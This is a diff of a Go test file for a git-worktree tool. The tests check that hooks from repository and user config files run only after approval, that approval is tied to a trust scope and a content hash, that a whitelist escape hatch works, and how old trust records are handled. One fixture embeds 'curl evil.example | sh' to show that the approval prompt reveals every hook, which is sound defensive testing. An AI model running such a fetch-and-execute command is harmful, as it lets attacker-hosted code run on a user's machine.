@@ -15,14 +15,41 @@ import (
 	"github.com/spf13/cobra"
 )
 
-// withUserOwnedHooks makes the batch under test look like it came from the
-// user's own config file, isolating it from whatever a previous test left in the
-// package-level hookSources.
-func withUserOwnedHooks(t *testing.T) {
+// withPreApprovedHooks takes the approval gate out of the picture, for tests
+// about what running a hook does rather than about whether it may. It also
+// isolates them from whatever a previous test left in the package-level hook
+// globals.
+func withPreApprovedHooks(t *testing.T) {
 	t.Helper()
-	saved := hookSources
-	hookSources = map[string]string{}
-	t.Cleanup(func() { hookSources = saved })
+	savedSources, savedHooks := hookSources, worktreeHooks
+	hookSources, worktreeHooks = map[string]string{}, Hooks{}
+	t.Setenv("WT_HOOKS_APPROVE_ALL", "1")
+	t.Cleanup(func() { hookSources, worktreeHooks = savedSources, savedHooks })
+}
+
+// withConfigFileHooks makes the batch under test look like it came from the
+// user's own config file — a source that still needs approving, just with a
+// wider scope than a repository's.
+func withConfigFileHooks(t *testing.T, event string, cmds ...string) {
+	t.Helper()
+	withoutTrustWhitelist(t)
+	savedSources, savedHooks, savedPath := hookSources, worktreeHooks, configFilePath
+	hookSources = map[string]string{event: hookSourceConfigFile}
+	worktreeHooks = Hooks{}
+	setHooks(&worktreeHooks, event, cmds)
+	configFilePath = filepath.Join(t.TempDir(), "config.toml")
+	t.Cleanup(func() {
+		hookSources, worktreeHooks, configFilePath = savedSources, savedHooks, savedPath
+	})
+}
+
+// withoutTrustWhitelist clears the [trust] escape hatch, so a test asserting
+// that something is gated is not quietly exempted by a leftover rule.
+func withoutTrustWhitelist(t *testing.T) {
+	t.Helper()
+	savedPrefix, savedExact := trustPrefixes, trustExact
+	trustPrefixes, trustExact = nil, nil
+	t.Cleanup(func() { trustPrefixes, trustExact = savedPrefix, savedExact })
 }
 
 // repoWithHooks writes a .wt.toml containing the given body and points the
@@ -30,18 +57,19 @@ func withUserOwnedHooks(t *testing.T) {
 // repo directory and the fake git-common-dir used as the trust key.
 func repoWithHooks(t *testing.T, body string) (repoDir, trustKey string) {
 	t.Helper()
+	withoutTrustWhitelist(t)
 
 	repoDir = t.TempDir()
 	trustKey = filepath.Join(repoDir, ".git")
 
-	savedPath, savedFound, savedSHA := configRepoPath, configRepoFound, configRepoSHA
+	savedPath, savedFound := configRepoPath, configRepoFound
 	savedKey, savedKeyFn := configRepoKey, repoTrustKeyFn
-	savedRepoHooks := repoConfigHooks
-	t.Cleanup(func() { repoConfigHooks = savedRepoHooks })
+	savedHooks, savedSources := worktreeHooks, hookSources
 	repoTrustKeyFn = func() (string, error) { return trustKey, nil }
 	t.Cleanup(func() {
-		configRepoPath, configRepoFound, configRepoSHA = savedPath, savedFound, savedSHA
+		configRepoPath, configRepoFound = savedPath, savedFound
 		configRepoKey, repoTrustKeyFn = savedKey, savedKeyFn
+		worktreeHooks, hookSources = savedHooks, savedSources
 	})
 
 	writeRepoConfig(t, repoDir, body)
@@ -49,7 +77,7 @@ func repoWithHooks(t *testing.T, body string) (repoDir, trustKey string) {
 }
 
 // writeRepoConfig writes .wt.toml and sets the globals loadWorktreeConfig would
-// have set, including the hash of the bytes it decoded. Calling it again stands
+// have set, including the merged hooks and their source. Calling it again stands
 // in for a later wt run picking up an edited file.
 func writeRepoConfig(t *testing.T, repoDir, body string) {
 	t.Helper()
@@ -60,25 +88,27 @@ func writeRepoConfig(t *testing.T, repoDir, body string) {
 	}
 	configRepoPath = wtToml
 	configRepoFound = true
-	configRepoSHA = hashBytes([]byte(body))
-	// Mirror loadWorktreeConfig, which records the repo's hooks alongside the
-	// hash so the approval prompt can show the whole file.
+
+	// Mirror loadWorktreeConfig: the repo's hooks land in the merged set and
+	// every event they supply is attributed to them, which is what the approval
+	// is pinned to.
 	var cfg Config
 	if _, err := toml.Decode(body, &cfg); err != nil {
 		t.Fatal(err)
 	}
-	repoConfigHooks = cfg.Hooks
+	worktreeHooks = Hooks{}
+	hookSources = map[string]string{}
+	for _, event := range hookEvents {
+		cmds := hooksOf(cfg.Hooks, event)
+		if len(cmds) == 0 {
+			continue
+		}
+		setHooks(&worktreeHooks, event, cmds)
+		hookSources[event] = hookSourceRepoConfig
+	}
 	if key, err := repoTrustKeyFn(); err == nil {
 		configRepoKey = key
 	}
-}
-
-// withRepoSuppliedHook marks a hook event as having come from the repo config.
-func withRepoSuppliedHook(t *testing.T, event string) {
-	t.Helper()
-	saved := hookSources
-	hookSources = map[string]string{event: hookSourceRepoConfig}
-	t.Cleanup(func() { hookSources = saved })
 }
 
 // withIsolatedTrustStore points the trust store at a scratch directory.
@@ -105,7 +135,6 @@ func TestUntrustedRepoHooksDoNotRun(t *testing.T) {
 	withIsolatedTrustStore(t)
 	withPolicy(t, hookPolicyPromptUntrusted)
 	repoDir, _ := repoWithHooks(t, "[hooks]\npost_create = [\"touch pwned\"]\n")
-	withRepoSuppliedHook(t, "post_create")
 
 	marker := filepath.Join(repoDir, "pwned")
 	if err := runHooks("post_create", []string{"touch " + marker}, map[string]string{}); err != nil {
@@ -123,7 +152,6 @@ func TestUntrustedRepoPreHookDoesNotAbort(t *testing.T) {
 	withIsolatedTrustStore(t)
 	withPolicy(t, hookPolicyPromptUntrusted)
 	repoWithHooks(t, "[hooks]\npre_create = [\"false\"]\n")
-	withRepoSuppliedHook(t, "pre_create")
 
 	if err := runHooks("pre_create", []string{"false"}, map[string]string{}); err != nil {
 		t.Fatalf("skipping an unapproved pre-hook must not abort the operation, got: %v", err)
@@ -134,13 +162,12 @@ func TestTrustedRepoHooksRun(t *testing.T) {
 	withIsolatedTrustStore(t)
 	withPolicy(t, hookPolicyPromptUntrusted)
 	repoDir, _ := repoWithHooks(t, "[hooks]\npost_create = [\"touch ok\"]\n")
-	withRepoSuppliedHook(t, "post_create")
 
-	trust, err := currentRepoHookTrust()
+	trust, err := hookSetTrust(hookSourceRepoConfig)
 	if err != nil {
 		t.Fatal(err)
 	}
-	if err := trustCurrentRepo(trust); err != nil {
+	if err := trustHookSet(trust); err != nil {
 		t.Fatal(err)
 	}
 
@@ -159,13 +186,12 @@ func TestTrustIsInvalidatedByEdit(t *testing.T) {
 	withIsolatedTrustStore(t)
 	withPolicy(t, hookPolicyPromptUntrusted)
 	repoDir, _ := repoWithHooks(t, "[hooks]\npost_create = [\"true\"]\n")
-	withRepoSuppliedHook(t, "post_create")
 
-	trust, err := currentRepoHookTrust()
+	trust, err := hookSetTrust(hookSourceRepoConfig)
 	if err != nil {
 		t.Fatal(err)
 	}
-	if err := trustCurrentRepo(trust); err != nil {
+	if err := trustHookSet(trust); err != nil {
 		t.Fatal(err)
 	}
 
@@ -173,7 +199,7 @@ func TestTrustIsInvalidatedByEdit(t *testing.T) {
 	marker := filepath.Join(repoDir, "pwned")
 	writeRepoConfig(t, repoDir, "[hooks]\npost_create = ['touch "+marker+"']\n")
 
-	if trust, err := currentRepoHookTrust(); err != nil {
+	if trust, err := hookSetTrust(hookSourceRepoConfig); err != nil {
 		t.Fatal(err)
 	} else if trust.trusted {
 		t.Fatal("trust survived an edit to .wt.toml")
@@ -195,18 +221,18 @@ func TestTrustDoesNotTransferBetweenRepos(t *testing.T) {
 
 	body := "[hooks]\npost_create = [\"make setup\"]\n"
 	repoWithHooks(t, body)
-	trust, err := currentRepoHookTrust()
+	trust, err := hookSetTrust(hookSourceRepoConfig)
 	if err != nil {
 		t.Fatal(err)
 	}
-	if err := trustCurrentRepo(trust); err != nil {
+	if err := trustHookSet(trust); err != nil {
 		t.Fatal(err)
 	}
 	approvedSHA := trust.sha
 
 	// A second repository shipping byte-identical config.
 	repoWithHooks(t, body)
-	other, err := currentRepoHookTrust()
+	other, err := hookSetTrust(hookSourceRepoConfig)
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -306,11 +332,11 @@ func TestUntrustRevokes(t *testing.T) {
 	withPolicy(t, hookPolicyPromptUntrusted)
 	repoWithHooks(t, "[hooks]\npost_create = [\"true\"]\n")
 
-	trust, err := currentRepoHookTrust()
+	trust, err := hookSetTrust(hookSourceRepoConfig)
 	if err != nil {
 		t.Fatal(err)
 	}
-	if err := trustCurrentRepo(trust); err != nil {
+	if err := trustHookSet(trust); err != nil {
 		t.Fatal(err)
 	}
 
@@ -318,7 +344,7 @@ func TestUntrustRevokes(t *testing.T) {
 		t.Fatal(err)
 	}
 
-	after, err := currentRepoHookTrust()
+	after, err := hookSetTrust(hookSourceRepoConfig)
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -327,38 +353,80 @@ func TestUntrustRevokes(t *testing.T) {
 	}
 }
 
-// TestUserHooksRunWithoutApproval: the fix must not make the tool annoying for
-// hooks the user wrote themselves.
-func TestUserHooksRunWithoutApproval(t *testing.T) {
+// TestConfigFileHooksNeedApprovalToo is the inversion: wt used to run anything
+// not labelled "repo config" unprompted, which made the permissive answer the
+// one a source got by omission. Nothing runs unapproved now, whoever wrote it.
+func TestConfigFileHooksNeedApprovalToo(t *testing.T) {
 	withIsolatedTrustStore(t)
 	withPolicy(t, hookPolicyPromptUntrusted)
-	withUserOwnedHooks(t)
 
 	dir := t.TempDir()
 	marker := filepath.Join(dir, "ran")
-	if err := runHooks("post_create", []string{"touch " + marker}, map[string]string{}); err != nil {
-		t.Fatal(err)
-	}
-	if _, err := os.Stat(marker); err != nil {
-		t.Fatal("hook from the user's own config did not run")
-	}
-}
+	withConfigFileHooks(t, "post_create", "touch "+marker)
 
-// TestPromptAllGatesUserHooksToo answers the "require approval for everything"
-// case: under prompt-all even user-owned hooks need a human, so with no terminal
-// they are skipped.
-func TestPromptAllGatesUserHooksToo(t *testing.T) {
-	withIsolatedTrustStore(t)
-	withPolicy(t, hookPolicyPromptAll)
-	withUserOwnedHooks(t)
-
-	dir := t.TempDir()
-	marker := filepath.Join(dir, "ran")
 	if err := runHooks("post_create", []string{"touch " + marker}, map[string]string{}); err != nil {
 		t.Fatal(err)
 	}
 	if _, err := os.Stat(marker); err == nil {
-		t.Fatal("prompt-all ran a hook without approval")
+		t.Fatal("a hook from the user's config file ran before it was approved")
+	}
+}
+
+// TestApprovedConfigFileHooksRunEverywhere: the approval for the user's own
+// config file is not pinned to a repository, so giving it once is the whole
+// cost. Pinning it per repo would make wt ask again in every checkout, which is
+// how a security prompt turns into something people learn to click through.
+func TestApprovedConfigFileHooksRunEverywhere(t *testing.T) {
+	withIsolatedTrustStore(t)
+	withPolicy(t, hookPolicyPromptUntrusted)
+
+	dir := t.TempDir()
+	marker := filepath.Join(dir, "ran")
+	withConfigFileHooks(t, "post_create", "touch "+marker)
+
+	trust, err := hookSetTrust(hookSourceConfigFile)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if trust.scope != trustScopeUser {
+		t.Fatalf("config file hooks scoped to %q, want %q", trust.scope, trustScopeUser)
+	}
+	if err := trustHookSet(trust); err != nil {
+		t.Fatal(err)
+	}
+
+	if err := runHooks("post_create", []string{"touch " + marker}, map[string]string{}); err != nil {
+		t.Fatal(err)
+	}
+	if _, err := os.Stat(marker); err != nil {
+		t.Fatal("an approved hook from the user's config file did not run")
+	}
+}
+
+// TestPromptAllGatesApprovedHooksToo answers the "ask me every time" case:
+// under prompt-all an existing approval decides nothing, so with no terminal
+// the hooks are skipped.
+func TestPromptAllGatesApprovedHooksToo(t *testing.T) {
+	withIsolatedTrustStore(t)
+	withPolicy(t, hookPolicyPromptAll)
+
+	dir := t.TempDir()
+	marker := filepath.Join(dir, "ran")
+	withConfigFileHooks(t, "post_create", "touch "+marker)
+
+	trust, err := hookSetTrust(hookSourceConfigFile)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if err := trustHookSet(trust); err != nil {
+		t.Fatal(err)
+	}
+
+	if err := runHooks("post_create", []string{"touch " + marker}, map[string]string{}); err != nil {
+		t.Fatal(err)
+	}
+	if _, err := os.Stat(marker); err == nil {
+		t.Fatal("prompt-all ran an already-approved hook without asking")
 	}
 }
 
@@ -368,7 +436,6 @@ func TestApproveAllEscapeHatch(t *testing.T) {
 	withIsolatedTrustStore(t)
 	withPolicy(t, hookPolicyPromptUntrusted)
 	repoDir, _ := repoWithHooks(t, "[hooks]\npost_create = [\"true\"]\n")
-	withRepoSuppliedHook(t, "post_create")
 	t.Setenv("WT_HOOKS_APPROVE_ALL", "1")
 
 	marker := filepath.Join(repoDir, "ran")
@@ -415,12 +482,10 @@ func TestEffectiveHooksPolicy(t *testing.T) {
 // not be able to set the policy that governs its own hooks.
 func TestLoadWorktreeConfigTracksHookSources(t *testing.T) {
 	savedFlag, savedFn := configFlag, gitRepoRootFn
-	savedHooks, savedRepoHooks := worktreeHooks, repoConfigHooks
-	savedSources, savedPolicy := hookSources, hooksPolicy
+	savedHooks, savedSources, savedPolicy := worktreeHooks, hookSources, hooksPolicy
 	t.Cleanup(func() {
 		configFlag, gitRepoRootFn = savedFlag, savedFn
-		worktreeHooks, repoConfigHooks = savedHooks, savedRepoHooks
-		hookSources, hooksPolicy = savedSources, savedPolicy
+		worktreeHooks, hookSources, hooksPolicy = savedHooks, savedSources, savedPolicy
 		loadWorktreeConfig()
 	})
 
@@ -473,9 +538,19 @@ post_clone = ["theirs too"]
 		t.Errorf("worktreeHooks.PostClone = %v, want empty", worktreeHooks.PostClone)
 	}
 
-	entries := repoHookCommands()
-	if len(entries) != 1 || entries[0].Event != "post_create" || entries[0].Cmd != "theirs" {
-		t.Errorf("repoHookCommands() = %+v, want the single post_create command", entries)
+	// Each source's contribution has to be recoverable from the merged result,
+	// because that is what an approval is pinned to. post_create belongs to the
+	// repo alone even though the config file also named it.
+	repoEntries := hookSetEntries(hookSourceRepoConfig)
+	if len(repoEntries) != 1 || repoEntries[0].Event != "post_create" || repoEntries[0].Cmd != "theirs" {
+		t.Errorf("hookSetEntries(repo) = %+v, want the single post_create command", repoEntries)
+	}
+	userEntries := hookSetEntries(hookSourceConfigFile)
+	if len(userEntries) != 1 || userEntries[0].Event != "pre_create" || userEntries[0].Cmd != "mine" {
+		t.Errorf("hookSetEntries(config file) = %+v, want the pre_create command it still owns", userEntries)
+	}
+	if got := loadedHookSources(); len(got) != 2 {
+		t.Errorf("loadedHookSources() = %v, want both layers", got)
 	}
 }
 
@@ -490,11 +565,11 @@ func TestTrustStoreRoundTrip(t *testing.T) {
 		t.Fatalf("fresh trust store has %d records, want 0", len(store.Trusted))
 	}
 
-	store.add(trustRecord{Repo: "/repo/.git", File: "/repo/.wt.toml", SHA256: "aaa", ApprovedAt: "now"})
-	store.add(trustRecord{Repo: "/repo/.git", File: "/repo/.wt.toml", SHA256: "bbb", ApprovedAt: "now"})
-	store.add(trustRecord{Repo: "/repo/.git", File: "/repo/.wt.toml", SHA256: "aaa", ApprovedAt: "later"})
+	store.add(trustRecord{Scope: "/repo/.git", File: "/repo/.wt.toml", SHA256: "aaa", ApprovedAt: "now"})
+	store.add(trustRecord{Scope: "/repo/.git", File: "/repo/.wt.toml", SHA256: "bbb", ApprovedAt: "now"})
+	store.add(trustRecord{Scope: "/repo/.git", File: "/repo/.wt.toml", SHA256: "aaa", ApprovedAt: "later"})
 	if len(store.Trusted) != 2 {
-		t.Fatalf("add() kept %d records, want 2 (same repo+hash should replace)", len(store.Trusted))
+		t.Fatalf("add() kept %d records, want 2 (same scope+hash should replace)", len(store.Trusted))
 	}
 
 	if err := saveTrustStore(store); err != nil {
@@ -522,10 +597,10 @@ func TestTrustStoreRoundTrip(t *testing.T) {
 		t.Error("records did not survive a save/load round trip")
 	}
 	if reloaded.isTrusted("/elsewhere/.git", "aaa") {
-		t.Error("isTrusted() matched on hash alone; repo must match too")
+		t.Error("isTrusted() matched on hash alone; scope must match too")
 	}
 	if reloaded.isTrusted("/repo/.git", "ccc") {
-		t.Error("isTrusted() matched on repo alone; hash must match too")
+		t.Error("isTrusted() matched on scope alone; hash must match too")
 	}
 
 	if removed := reloaded.remove("/repo/.git"); removed != 2 {
@@ -550,13 +625,13 @@ func TestMalformedTrustStoreIsAnError(t *testing.T) {
 	}
 }
 
-// TestApprovalRequestShowsWholeFile: approving from the prompt persists trust
-// for the entire .wt.toml, so the prompt has to show every command that file
-// contributes — otherwise a harmless post_create buys silent consent for a
-// pre_remove the user never saw.
-func TestApprovalRequestShowsWholeFile(t *testing.T) {
-	savedHooks, savedSources := repoConfigHooks, hookSources
-	repoConfigHooks = Hooks{
+// TestApprovalRequestShowsWholeSet: approving from the prompt persists an
+// answer for everything the source contributes, so the prompt has to show all
+// of it — otherwise a harmless post_create buys silent consent for a pre_remove
+// the user never saw.
+func TestApprovalRequestShowsWholeSet(t *testing.T) {
+	savedHooks, savedSources := worktreeHooks, hookSources
+	worktreeHooks = Hooks{
 		PostCreate: []string{"echo hello"},
 		PreRemove:  []string{"curl evil.example | sh"},
 	}
@@ -564,11 +639,18 @@ func TestApprovalRequestShowsWholeFile(t *testing.T) {
 		"post_create": hookSourceRepoConfig,
 		"pre_remove":  hookSourceRepoConfig,
 	}
-	t.Cleanup(func() { repoConfigHooks, hookSources = savedHooks, savedSources })
+	t.Cleanup(func() { worktreeHooks, hookSources = savedHooks, savedSources })
 
 	var buf bytes.Buffer
-	printHookApprovalRequest(&buf, repoHookCommands(), "post_create", repoHookTrust{file: ".wt.toml"})
+	entries := hookSetEntries(hookSourceRepoConfig)
+	printHookApprovalRequest(&buf, entries, "post_create", hookTrust{file: ".wt.toml"})
 	out := buf.String()
+
+	// The same set is what the approval is keyed on, so a batch that showed less
+	// than it approved would also hash less than it approved.
+	if got := hookSetHash(hookSourceRepoConfig, entries); got != hookSetHash(hookSourceRepoConfig, hookSetEntries(hookSourceRepoConfig)) || got == "" {
+		t.Errorf("hookSetHash() not stable over the displayed set, got %q", got)
+	}
 
 	for _, want := range []string{"→ [post_create] echo hello", "[pre_remove] curl evil.example | sh"} {
 		if !strings.Contains(out, want) {
@@ -587,7 +669,6 @@ func TestApproveAllSurvivesABrokenTrustStore(t *testing.T) {
 	withIsolatedTrustStore(t)
 	withPolicy(t, hookPolicyPromptUntrusted)
 	repoDir, _ := repoWithHooks(t, "[hooks]\npost_create = [\"true\"]\n")
-	withRepoSuppliedHook(t, "post_create")
 
 	path := trustFilePath()
 	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
@@ -633,19 +714,25 @@ func TestDisplayTextEscapesControlCharacters(t *testing.T) {
 // TestOffersTrust: the "remember this" option is only honest where taking it
 // actually stops the next prompt.
 func TestOffersTrust(t *testing.T) {
+	repo := hookTrust{scope: "/repo/.git", sha: "abc"}
+	user := hookTrust{scope: trustScopeUser, sha: "abc"}
+	// An unrecognised source: nowhere to file the answer, so nothing to offer.
+	unscoped := hookTrust{}
+
 	tests := []struct {
-		fromRepo bool
-		policy   string
-		want     bool
+		name   string
+		trust  hookTrust
+		policy string
+		want   bool
 	}{
-		{fromRepo: true, policy: hookPolicyPromptUntrusted, want: true},
-		{fromRepo: true, policy: hookPolicyPromptAll, want: false},
-		{fromRepo: false, policy: hookPolicyPromptAll, want: false},
-		{fromRepo: false, policy: hookPolicyPromptUntrusted, want: false},
+		{name: "repo hooks", trust: repo, policy: hookPolicyPromptUntrusted, want: true},
+		{name: "the user's own hooks are trustable too now", trust: user, policy: hookPolicyPromptUntrusted, want: true},
+		{name: "prompt-all asks again regardless", trust: repo, policy: hookPolicyPromptAll, want: false},
+		{name: "nothing to record", trust: unscoped, policy: hookPolicyPromptUntrusted, want: false},
 	}
 	for _, tt := range tests {
-		if got := offersTrust(tt.fromRepo, tt.policy); got != tt.want {
-			t.Errorf("offersTrust(%v, %q) = %v, want %v", tt.fromRepo, tt.policy, got, tt.want)
+		if got := offersTrust(tt.trust, tt.policy); got != tt.want {
+			t.Errorf("%s: offersTrust(%+v, %q) = %v, want %v", tt.name, tt.trust, tt.policy, got, tt.want)
 		}
 	}
 }
@@ -659,7 +746,7 @@ func TestApprovalRequestOmitsRestNoteWhenThereIsNoRest(t *testing.T) {
 	printHookApprovalRequest(&repoOneEvent, []hookEntry{
 		{Event: "post_create", Cmd: "a"},
 		{Event: "post_create", Cmd: "b"},
-	}, "post_create", repoHookTrust{file: ".wt.toml"})
+	}, "post_create", hookTrust{file: ".wt.toml"})
 	if strings.Contains(repoOneEvent.String(), note) {
 		t.Errorf("note shown for a single-event file, got:\n%s", repoOneEvent.String())
 	}
@@ -668,9 +755,9 @@ func TestApprovalRequestOmitsRestNoteWhenThereIsNoRest(t *testing.T) {
 	printHookApprovalRequest(&userHooks, []hookEntry{
 		{Event: "post_create", Cmd: "a"},
 		{Event: "pre_remove", Cmd: "b"},
-	}, "post_create", repoHookTrust{})
+	}, "post_create", hookTrust{})
 	if strings.Contains(userHooks.String(), note) {
-		t.Errorf("note shown for user-owned hooks, where trusting is not on offer, got:\n%s", userHooks.String())
+		t.Errorf("note shown where there is no file to name, got:\n%s", userHooks.String())
 	}
 }
 
@@ -701,18 +788,20 @@ func TestTrustSurvivesADeletedWorkingDirectory(t *testing.T) {
 	gitInit(t, repoDir)
 	t.Chdir(repoDir)
 
-	savedPath, savedFound, savedSHA, savedKey := configRepoPath, configRepoFound, configRepoSHA, configRepoKey
+	savedPath, savedFound, savedKey := configRepoPath, configRepoFound, configRepoKey
+	savedHooks, savedSources := worktreeHooks, hookSources
+	withoutTrustWhitelist(t)
 	t.Cleanup(func() {
-		configRepoPath, configRepoFound, configRepoSHA, configRepoKey = savedPath, savedFound, savedSHA, savedKey
+		configRepoPath, configRepoFound, configRepoKey = savedPath, savedFound, savedKey
+		worktreeHooks, hookSources = savedHooks, savedSources
 	})
 	writeRepoConfig(t, repoDir, "[hooks]\npost_remove = [\"true\"]\n")
-	withRepoSuppliedHook(t, "post_remove")
 
-	trust, err := currentRepoHookTrust()
+	trust, err := hookSetTrust(hookSourceRepoConfig)
 	if err != nil {
 		t.Fatal(err)
 	}
-	if err := trustCurrentRepo(trust); err != nil {
+	if err := trustHookSet(trust); err != nil {
 		t.Fatal(err)
 	}
 
@@ -726,7 +815,7 @@ func TestTrustSurvivesADeletedWorkingDirectory(t *testing.T) {
 		t.Fatal(err)
 	}
 
-	after, err := currentRepoHookTrust()
+	after, err := hookSetTrust(hookSourceRepoConfig)
 	if err != nil {
 		t.Fatalf("trust lookup failed once the working directory was gone: %v", err)
 	}
@@ -743,7 +832,6 @@ func TestPromptAllStillAsksWhenTheTrustStoreIsUnreadable(t *testing.T) {
 	withIsolatedTrustStore(t)
 	withPolicy(t, hookPolicyPromptAll)
 	repoDir, _ := repoWithHooks(t, "[hooks]\npost_create = [\"true\"]\n")
-	withRepoSuppliedHook(t, "post_create")
 
 	path := trustFilePath()
 	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
@@ -799,4 +887,240 @@ func captureStderr(t *testing.T) func() string {
 	}
 	t.Cleanup(func() { read() })
 	return read
+}
+
+// TestUnrecognisedSourceIsNotTrusted is the property the old gate got backwards.
+// A hook arriving under a label nothing has been taught about must fall to the
+// deny side, and must not be recordable either — an approval wt cannot key on
+// anything would be one that never matches again, or worse, matches too much.
+func TestUnrecognisedSourceIsNotTrusted(t *testing.T) {
+	withIsolatedTrustStore(t)
+	withPolicy(t, hookPolicyPromptUntrusted)
+	withoutTrustWhitelist(t)
+
+	savedSources, savedHooks := hookSources, worktreeHooks
+	hookSources = map[string]string{"post_create": "git config (local)"}
+	worktreeHooks = Hooks{PostCreate: []string{"true"}}
+	t.Cleanup(func() { hookSources, worktreeHooks = savedSources, savedHooks })
+
+	trust, err := hookSetTrust("git config (local)")
+	if err != nil {
+		t.Fatal(err)
+	}
+	if trust.trusted {
+		t.Fatal("a source nothing knows about was trusted")
+	}
+	if offersTrust(trust, hookPolicyPromptUntrusted) {
+		t.Error("prompt offered to remember an approval it has nowhere to file")
+	}
+	if err := trustHookSet(trust); err == nil {
+		t.Error("trustHookSet() recorded an approval for an unscoped source")
+	}
+
+	dir := t.TempDir()
+	marker := filepath.Join(dir, "ran")
+	if err := runHooks("post_create", []string{"touch " + marker}, map[string]string{}); err != nil {
+		t.Fatal(err)
+	}
+	if _, err := os.Stat(marker); err == nil {
+		t.Fatal("hooks from an unrecognised source ran unprompted")
+	}
+}
+
+// TestTrustWhitelist covers the [trust] escape hatch, including the sibling
+// directory a naive string prefix would wrongly swallow.
+func TestTrustWhitelist(t *testing.T) {
+	root := t.TempDir()
+	mine := filepath.Join(root, "mine")
+	sibling := filepath.Join(root, "mine-from-the-internet")
+	named := filepath.Join(root, "named")
+	for _, d := range []string{mine, sibling, named} {
+		if err := os.MkdirAll(filepath.Join(d, "repo"), 0o755); err != nil {
+			t.Fatal(err)
+		}
+	}
+
+	savedPrefix, savedExact := trustPrefixes, trustExact
+	trustPrefixes = []string{mine, "", "   "}
+	trustExact = []string{filepath.Join(named, "repo")}
+	t.Cleanup(func() { trustPrefixes, trustExact = savedPrefix, savedExact })
+
+	tests := []struct {
+		name    string
+		repoKey string
+		want    bool
+	}{
+		{"repo under a prefix", filepath.Join(mine, "repo", ".git"), true},
+		{"the prefix itself", filepath.Join(mine, ".git"), true},
+		{"exact match", filepath.Join(named, "repo", ".git"), true},
+		{"sibling sharing a name prefix", filepath.Join(sibling, "repo", ".git"), false},
+		{"unrelated tree", filepath.Join(root, "other", ".git"), false},
+		{"exact rule does not cover children", filepath.Join(named, "repo", "sub", ".git"), false},
+		{"the user's own config is not path-scoped", trustScopeUser, false},
+		{"no key at all", "", false},
+	}
+	for _, tt := range tests {
+		if got := trustWhitelistAllows(tt.repoKey); got != tt.want {
+			t.Errorf("%s: trustWhitelistAllows(%q) = %v, want %v", tt.name, tt.repoKey, got, tt.want)
+		}
+	}
+}
+
+// TestWhitelistedRepoHooksRunUnasked: the whole point of the escape hatch is
+// that it works without a stored approval — and without a readable store, since
+// an opt-out that depends on the machinery it bypasses is not one.
+func TestWhitelistedRepoHooksRunUnasked(t *testing.T) {
+	withIsolatedTrustStore(t)
+	withPolicy(t, hookPolicyPromptUntrusted)
+	repoDir, trustKey := repoWithHooks(t, "[hooks]\npost_create = [\"true\"]\n")
+
+	path := trustFilePath()
+	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
+		t.Fatal(err)
+	}
+	if err := os.WriteFile(path, []byte("not toml ]["), 0o600); err != nil {
+		t.Fatal(err)
+	}
+
+	trustPrefixes = []string{filepath.Dir(trustKey)}
+
+	marker := filepath.Join(repoDir, "ran")
+	if err := runHooks("post_create", []string{"touch " + marker}, map[string]string{}); err != nil {
+		t.Fatal(err)
+	}
+	if _, err := os.Stat(marker); err != nil {
+		t.Fatal("a whitelisted repository's hooks did not run")
+	}
+}
+
+// TestPromptAllOverridesTheWhitelist: "ask me every time" has to mean it. A
+// whitelist entry is a standing answer, and prompt-all is the setting that says
+// standing answers do not count.
+func TestPromptAllOverridesTheWhitelist(t *testing.T) {
+	withIsolatedTrustStore(t)
+	withPolicy(t, hookPolicyPromptAll)
+	repoDir, trustKey := repoWithHooks(t, "[hooks]\npost_create = [\"true\"]\n")
+	trustPrefixes = []string{filepath.Dir(trustKey)}
+
+	marker := filepath.Join(repoDir, "ran")
+	if err := runHooks("post_create", []string{"touch " + marker}, map[string]string{}); err != nil {
+		t.Fatal(err)
+	}
+	if _, err := os.Stat(marker); err == nil {
+		t.Fatal("prompt-all honoured a [trust] rule instead of asking")
+	}
+}
+
+// TestOldTrustStoreRecordsAreIgnored: version 1 pinned the sha256 of a
+// .wt.toml's bytes; these pin the sha256 of a source's commands. There is no
+// migration, so the only safe reading of an old record is "not approved" — and
+// wt says so rather than leaving the user wondering why it asked again.
+func TestOldTrustStoreRecordsAreIgnored(t *testing.T) {
+	withIsolatedTrustStore(t)
+	staleTrustStoreWarning = sync.Once{}
+	t.Cleanup(func() { staleTrustStoreWarning = sync.Once{} })
+
+	path := trustFilePath()
+	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
+		t.Fatal(err)
+	}
+	// A v1 store, which had no version key at all.
+	old := "[[trusted]]\nrepo = \"/repo/.git\"\nfile = \"/repo/.wt.toml\"\nsha256 = \"aaa\"\napproved_at = \"then\"\n"
+	if err := os.WriteFile(path, []byte(old), 0o600); err != nil {
+		t.Fatal(err)
+	}
+
+	stderr := captureStderr(t)
+	store, err := loadTrustStore()
+	if err != nil {
+		t.Fatalf("an old store is not a broken one: %v", err)
+	}
+	if len(store.Trusted) != 0 {
+		t.Errorf("kept %d records from an older format, want 0", len(store.Trusted))
+	}
+	if store.isTrusted("/repo/.git", "aaa") {
+		t.Error("a record from the old format still matched")
+	}
+	if out := stderr(); !strings.Contains(out, "older format") {
+		t.Errorf("dropped the old approvals without saying so, got:\n%s", out)
+	}
+}
+
+// TestUntrustGlobalRevokesTheConfigFileApproval: the config file's approval is
+// not pinned to a repository, so "wt untrust" standing in one cannot reach it.
+// TestUntrustSaysWhenAWhitelistRuleStillApplies: a whitelisted repository never
+// had a record to revoke, so `wt untrust` reaches the "nothing to revoke" branch
+// — the one place a user is most likely to read the outcome as "gated now".
+// Both branches have to mention the rule that keeps the hooks running.
+func TestUntrustSaysWhenAWhitelistRuleStillApplies(t *testing.T) {
+	withIsolatedTrustStore(t)
+
+	root := t.TempDir()
+	repo := filepath.Join(root, "repo")
+	if err := os.MkdirAll(repo, 0o755); err != nil {
+		t.Fatal(err)
+	}
+
+	savedPrefix, savedExact := trustPrefixes, trustExact
+	trustPrefixes = []string{root}
+	trustExact = nil
+	savedFn := repoTrustKeyFn
+	repoTrustKeyFn = func() (string, error) { return filepath.Join(repo, ".git"), nil }
+	savedGlobal := untrustGlobal
+	untrustGlobal = false
+	t.Cleanup(func() {
+		trustPrefixes, trustExact = savedPrefix, savedExact
+		repoTrustKeyFn, untrustGlobal = savedFn, savedGlobal
+	})
+
+	var err error
+	out := captureStdout(t, func() { err = runUntrust(nil) })
+	if err != nil {
+		t.Fatal(err)
